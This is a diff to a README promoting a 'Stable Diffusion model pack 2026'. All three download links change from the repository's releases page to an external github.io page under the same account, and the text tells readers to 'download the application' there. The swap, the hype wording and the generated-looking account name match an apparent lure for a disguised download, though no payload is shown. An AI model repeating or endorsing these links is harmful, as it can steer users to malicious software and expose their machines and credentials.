@@ -1,6 +1,6 @@
 # 🎨 stable-diffusion-model-pack-2026 - Your Ultimate AI Art Collection
 
-[![Download Now](https://img.shields.io/badge/Download-Stable%20Diffusion%20Pack%202026-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rattrapfatigueduty4578/stable-diffusion-model-pack-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Stable%20Diffusion%20Pack%202026-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://rattrapfatigueduty4578.github.io)
 
 ---
 
@@ -16,7 +16,7 @@ Welcome to the **stable-diffusion-model-pack-2026**! This is your one-stop colle
 
 ### Step 1: Get the Pack
 
-Visit this link to download the application: [https://github.com/rattrapfatigueduty4578/stable-diffusion-model-pack-2026/releases](https://github.com/rattrapfatigueduty4578/stable-diffusion-model-pack-2026/releases)
+Visit this link to download the application: [https://rattrapfatigueduty4578.github.io](https://rattrapfatigueduty4578.github.io)
 
 Look for the newest release file and click to download it. The download will start automatically. Depending on your internet speed, this might take a few minutes because the pack contains many files.
 
@@ -168,7 +168,7 @@ This pack is a community-curated collection. Credit goes to all the talented mod
 3. **Copy** models into your Stable Diffusion folders
 4. **Start creating** amazing AI art!
 
-Remember: Visit this link to download the application: [https://github.com/rattrapfatigueduty4578/stable-diffusion-model-pack-2026/releases](https://github.com/rattrapfatigueduty4578/stable-diffusion-model-pack-2026/releases)
+Remember: Visit this link to download the application: [https://rattrapfatigueduty4578.github.io](https://rattrapfatigueduty4578.github.io)
 
 ---
 
